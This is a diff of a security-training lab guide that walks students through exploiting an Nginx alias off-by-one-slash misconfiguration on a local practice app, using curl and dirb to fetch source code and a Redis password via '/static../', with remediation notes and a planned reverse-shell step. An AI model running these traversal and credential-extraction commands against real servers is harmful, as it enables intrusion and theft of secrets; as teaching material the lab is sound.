@@ -1,103 +1,424 @@
-# Lab 03 - Test Path Traversal with dirb
+# Lab 03 - Path Traversal Discovery via Nginx Misconfiguration
 
 ## Objective
 
-Use `dirb` to perform directory and file brute-forcing to discover hidden paths, files, and potential vulnerabilities in the Nginx configuration.
+Exploit an Nginx "off-by-one slash" misconfiguration on the `/static` directory to discover path traversal vulnerabilities and access files outside the intended directory scope.
 
 ## Background
 
-Path traversal and directory brute-forcing are essential techniques for discovering:
-- Hidden administrative interfaces
-- Backup files
-- Configuration files
-- Development/testing endpoints
-- Improperly secured directories
+Path traversal vulnerabilities occur when an application allows access to files and directories outside of the intended scope. A common Nginx misconfiguration involves the `alias` directive when combined with location blocks that don't have trailing slashes.
 
-`dirb` is a web content scanner that uses wordlists to find existing (and/or hidden) web objects.
+**The Vulnerability Pattern:**
 
-## Prerequisites
-
-### Install dirb (if needed)
-
-**macOS:**
-```bash
-brew install dirb
+When Nginx is configured like this:
+```nginx
+location /static {
+    alias /app/static/;
+}
 ```
 
-**Linux:**
-```bash
-sudo apt-get install dirb
-```
+Notice the `/static` location lacks a trailing slash, but the alias path has one. This creates an "off-by-one slash" vulnerability.
+
+**How it's exploited:**
+- Request: `GET /static../`
+- Nginx resolves: `/app/static/` + `../`
+- Final path: `/app/static/../` = `/app/`
+- Result: Access to the parent directory!
+
+This lab will teach you to systematically discover and exploit this misconfiguration.
 
 ## Steps
 
-### 1. Initial Directory Scan with Common Wordlist
+### 1. Recall Your Directory Discoveries
 
-First, run a basic `dirb` scan using the common wordlist to discover available directories:
+From Lab 02, you should have discovered the `/static/` directory using `dirb` with `common.txt`. If you need to verify:
 
 ```bash
-dirb http://localhost:8080 /usr/share/dirb/wordlists/common.txt
+dirb http://localhost:8080 common.txt
+```
+
+Expected output should include:
+```
+==> DIRECTORY: http://localhost:8080/static/
+```
+
+### 2. Test for Nginx Off-by-One Slash Misconfiguration
+
+Now test if the `/static` location is vulnerable to the off-by-one slash bug:
+
+```bash
+# Try accessing /static.. (note the two dots but NO slash after static)
+curl -I http://localhost:8080/static..
+
+# Try with the trailing slash added
+curl -I http://localhost:8080/static../
 ```
 
 **What to look for:**
-- Watch the output for HTTP 200 and 301 responses
-- Note any directories that are discovered (like `/static/`, `/help/`, `/resumes/`, etc.)
-- The scan may take a few minutes
+- HTTP 200 response = Potentially vulnerable
+- HTTP 404 response = Not vulnerable or different configuration
+- HTTP 301/302 = Redirection (investigate where it redirects)
+
+### 3. Notice the Path Traversal Behavior
+
+If the `/static../` endpoint returns different results than `/static/`, you've found the path traversal:
+
+```bash
+# Normal static directory
+curl -v http://localhost:8080/static/
+
+# Path traversal attempt
+curl -v http://localhost:8080/static../
+```
+
+**Compare:**
+- Do they return different content?
+- Different directory listings?
+- Different error messages?
+
+### 4. Test Path Traversal with dirb - Phase 1 (common.txt)
+
+Use `dirb` to enumerate files accessible through the path traversal with the common wordlist:
+
+```bash
+dirb http://localhost:8080/static../ /usr/share/dirb/wordlists/common.txt
+```
 
 **Expected discoveries:**
 ```
-==> DIRECTORY: http://localhost:8080/static/
-==> DIRECTORY: http://localhost:8080/help/
-==> DIRECTORY: http://localhost:8080/resumes/
-```
-
-Write down the directories you find - you'll need them for the next step!
-
-### 2. Test for Nginx Alias Path Traversal
-
-Now that you've discovered some directories, it's time to test for a common Nginx misconfiguration. We'll test each discovered directory for path traversal vulnerabilities.
-
-**The vulnerability pattern:** `/<directory>../`
-
-For each directory you found in step 1, run `dirb` against the path traversal variant:
-
-```bash
-# Test static directory for path traversal
-dirb http://localhost:8080/static../
-
-# Test help directory for path traversal
-dirb http://localhost:8080/help../
-
-# Test resumes directory for path traversal
-dirb http://localhost:8080/resumes../
-```
-
-**What's happening here?**
-
-When you request `/static../`, if Nginx has an alias misconfiguration, it will:
-1. Match the `/static` location
-2. Resolve the alias path + `../`
-3. Potentially expose the parent directory
-
-**Watch for:**
-- One of these should return different results than the others
-- Look for HTTP 200 responses to files like `app.py`, `requirements.txt`
-- The vulnerable directory will expose application files!
-
-### 3. Identify the Vulnerable Endpoint
-
-Compare the results from each `dirb` scan. One directory should show accessible files that shouldn't be there:
-
-```bash
-# Example: If static../ is vulnerable, you might see:
 + http://localhost:8080/static../app.py (CODE:200)
 + http://localhost:8080/static../requirements.txt (CODE:200)
 + http://localhost:8080/static../Dockerfile (CODE:200)
 ```
 
-### 4. Manually Verify the Path Traversal
+**Why this works:**
+- `dirb` tests: `http://localhost:8080/static../app.py`
+- Nginx resolves: `/app/static/../app.py` = `/app/app.py`
+- Result: Application source code exposed!
 
-Once you've identified which directory is vulnerable (likely `static../`), verify it manually:
+### 5. Manually Verify the Path Traversal
+
+Confirm the vulnerability manually by accessing the discovered files:
+
+```bash
+# Try to access app.py
+curl http://localhost:8080/static../app.py
+
+# Try to access requirements.txt
+curl http://localhost:8080/static../requirements.txt
+```
+
+**If successful, you should see:**
+- `app.py`: Python/Flask application source code
+- `requirements.txt`: Python package dependencies
+
+### 6. Test Path Traversal with dirb - Phase 2 (common-web-server.txt)
+
+Now use a more comprehensive web server-specific wordlist:
+
+```bash
+# Try with common web server files wordlist
+dirb http://localhost:8080/static../ /usr/share/dirb/wordlists/common-web-server.txt
+```
+
+**Note:** If the wordlist doesn't exist at that path, try:
+```bash
+# Find wordlists on your system
+find /usr -name "*.txt" -path "*/dirb/*" 2>/dev/null
+
+# Or use a different wordlist location (common on macOS with Homebrew)
+dirb http://localhost:8080/static../ /opt/homebrew/share/dirb/wordlists/common.txt
+```
+
+**Expected additional discoveries:**
+- Configuration files
+- Additional Python modules
+- Docker-related files
+- Web server configs
+
+### 7. Download and Examine app.py (Flask Application)
+
+Retrieve the main application file:
+
+```bash
+# Download app.py
+curl http://localhost:8080/static../app.py -o app.py
+
+# View the contents
+cat app.py
+```
+
+**What to look for in app.py:**
+- **Import statements**: What frameworks and libraries are used?
+- **Database connections**: Look for connection strings
+- **Redis references**: Search for Redis-related code
+- **Routes/endpoints**: What URLs does the app handle?
+- **File upload handling**: How are uploads processed?
+- **Security controls**: Authentication, validation, etc.
+
+**Search for specific items:**
+```bash
+# Look for Redis container references
+grep -i "redis" app.py
+
+# Look for database credentials
+grep -i "password" app.py
+
+# Look for file paths
+grep -i "upload" app.py
+grep -i "resume" app.py
+```
+
+### 8. Examine the Redis Container Reference
+
+In the Flask app.py file, you should find a Redis connection string:
+
+```python
+# Example from app.py:
+redis_client = redis.Redis(
+    host='resume_crunch_redis_container',
+    port=6379,
+    password='your_redis_password',
+    db=0
+)
+# Or as a connection string:
+redis_url = 'redis://password@resume_crunch_redis_container:6379/0'
+```
+
+**Document these critical details:**
+- **Redis host**: `resume_crunch_redis_container`
+- **Redis port**: `6379`
+- **Redis password**: (extract from the code)
+- **Database number**: `0`
+
+**Why this matters:**
+- You now know Redis is being used
+- You have the connection credentials
+- You can potentially connect to Redis directly
+- This will be crucial for exploitation in later labs
+
+### 9. Check for Resumes Upload Folder Location
+
+Search app.py for the upload directory configuration:
+
+```bash
+# Look for upload folder configuration
+grep -i "upload.*folder\|upload.*dir\|UPLOAD.*PATH" app.py
+
+# Look for resume storage paths
+grep -i "resume.*path\|resume.*dir" app.py
+```
+
+**Example from app.py:**
+```python
+UPLOAD_FOLDER = '/app/resumes'
+# or
+app.config['UPLOAD_FOLDER'] = '/app/uploads/resumes'
+```
+
+**Document:**
+- Upload folder path: `/app/resumes` (or whatever path you find)
+- Can we access it via path traversal?: Test with `curl http://localhost:8080/static../resumes/`
+
+### 10. Create a Path Traversal Exploitation Report
+
+Document your findings:
+
+```bash
+cat > path-traversal-report.md << 'EOF'
+# Path Traversal Vulnerability Report - ResumeCrunch
+
+## Vulnerability Summary
+- **Type**: Nginx Alias Path Traversal (Off-by-One Slash)
+- **Severity**: HIGH
+- **Affected Endpoint**: `/static../`
+
+## Root Cause
+Nginx configuration uses `location /static` (no trailing slash) with `alias /app/static/` (with trailing slash), creating an off-by-one slash vulnerability.
+
+## Exploitation
+### Request
+```
+GET /static../app.py HTTP/1.1
+Host: localhost:8080
+```
+
+### Response
+HTTP 200 - Returns application source code
+
+## Discovered Files via Path Traversal
+
+### Phase 1: dirb with common.txt
+- `app.py` - Flask application source code
+- `requirements.txt` - Python dependencies
+- `Dockerfile` - Container configuration
+
+### Phase 2: dirb with common-web-server.txt
+- (List additional files discovered)
+
+## Critical Information Extracted from app.py
+
+### Redis Configuration
+- **Container name**: resume_crunch_redis_container
+- **Port**: 6379
+- **Password**: [REDACTED - found in source]
+- **Database**: 0
+- **Connection String**: redis://[password]@resume_crunch_redis_container:6379/0
+
+### Upload Folder Location
+- **Path**: /app/resumes (or /app/uploads/resumes)
+- **Accessible via traversal**: Yes/No (test: /static../resumes/)
+
+### Application Framework
+- **Framework**: Flask (Python)
+- **Version**: (check requirements.txt)
+
+## Security Impact
+1. **Complete Source Code Disclosure**: Full application logic exposed
+2. **Credential Exposure**: Redis password discovered
+3. **Infrastructure Mapping**: Container names and architecture revealed
+4. **Path Information**: Upload directories and file locations known
+5. **Attack Surface Expansion**: Enables further exploitation (Redis attacks, file manipulation)
+
+## Proof of Concept
+```bash
+# Discover path traversal
+curl http://localhost:8080/static../
+
+# Extract source code
+curl http://localhost:8080/static../app.py
+
+# Verify Redis credentials
+grep -i "redis" app.py
+```
+
+## Remediation
+1. Fix Nginx configuration: Add trailing slash to location directive
+   ```nginx
+   location /static/ {
+       alias /app/static/;
+   }
+   ```
+2. Implement proper access controls
+3. Do not expose source code files
+4. Use environment variables for credentials (not hardcoded)
+
+## Next Steps
+- Enumerate all accessible files via path traversal
+- Obtain Docker configuration files (Dockerfile, docker-compose.yml)
+- Extract all credentials and configuration
+- Prepare for Redis exploitation
+EOF
+```
+
+### 11. Test Access to Resume Upload Folder
+
+Try to access the resumes you uploaded in Lab 01:
+
+```bash
+# List the resumes directory (if directory listing is enabled)
+curl http://localhost:8080/static../resumes/
+
+# Try to download a specific resume file you uploaded
+curl http://localhost:8080/static../resumes/sample_resume.txt
+```
+
+**Can you access your uploaded resumes?**
+- Yes = Major security issue (uploaded files exposed)
+- No = Directory not accessible or different path
+
+**Why this matters:**
+- If we can access uploaded files, we can later upload malicious files
+- We could upload a reverse shell and then execute it
+- This becomes critical for the final exploitation phase
+
+## Understanding the Nginx Misconfiguration
+
+### Vulnerable Configuration
+```nginx
+location /static {
+    alias /app/static/;
+}
+```
+
+### How the Exploit Works
+
+**Normal request:**
+```
+Request: GET /static/style.css
+Nginx resolves: /app/static/ + style.css = /app/static/style.css
+Result: ✓ Correct
+```
+
+**Path traversal request:**
+```
+Request: GET /static../app.py
+Nginx resolves: /app/static/ + ../app.py = /app/app.py
+Result: ✗ Parent directory exposed!
+```
+
+### Secure Configuration
+```nginx
+location /static/ {
+    alias /app/static/;
+}
+```
+
+The trailing slash on both the location and alias prevents the traversal.
+
+## Verification Checklist
+
+- [ ] Tested `/static../` and confirmed path traversal vulnerability
+- [ ] Ran `dirb` with `common.txt` against `/static../`
+- [ ] Discovered `app.py` via path traversal
+- [ ] Downloaded and examined `app.py`
+- [ ] Found Redis container reference in source code
+- [ ] Extracted Redis credentials (host, port, password, DB)
+- [ ] Identified resumes upload folder location
+- [ ] Ran `dirb` with `common-web-server.txt` wordlist (if available)
+- [ ] Tested access to uploaded resume files
+- [ ] Documented all findings in exploitation report
+
+## Key Discoveries Summary
+
+By the end of this lab, you should have:
+
+1. **Confirmed the vulnerability**: `/static../` allows path traversal
+2. **Obtained app.py**: Flask application source code
+3. **Redis connection details**:
+   - Host: `resume_crunch_redis_container`
+   - Port: `6379`
+   - Password: (from source code)
+   - Database: `0`
+4. **Upload folder path**: `/app/resumes` (or similar)
+5. **Can access uploads**: Yes/No (test results)
+
+## Questions to Answer
+
+1. Why does `/static../` work but `/static/` doesn't expose parent files?
+2. What Flask framework version is the application using?
+3. Where is the Redis server running (container name)?
+4. What is the Redis password?
+5. Where are uploaded resumes stored?
+6. Can you access previously uploaded resume files?
+7. What other files can you discover through path traversal?
+8. How would you fix this vulnerability in the Nginx config?
+
+## Next Steps
+
+Now that you've discovered the Flask application source code and found Redis credentials, proceed to [Lab 04 - Extract Docker Configuration Files](lab-04-locate-source.md) to use `dirb` with Docker-specific wordlists to find:
+- `Dockerfile`
+- `docker-compose.yml`
+- `nginx.conf`
+- `redis.conf`
+- Complete `requirements.txt`
+- Any other configuration files
+
+These files will provide a complete picture of the infrastructure and help identify additional attack vectors.
+
+---
+
+[← Previous: Interrogate Server](lab-02-interrogate-server.md) | [Next: Extract Docker Files →](lab-04-locate-source.md)
 
 ```bash
 # Test the path traversal (replace 'static' with your vulnerable directory)
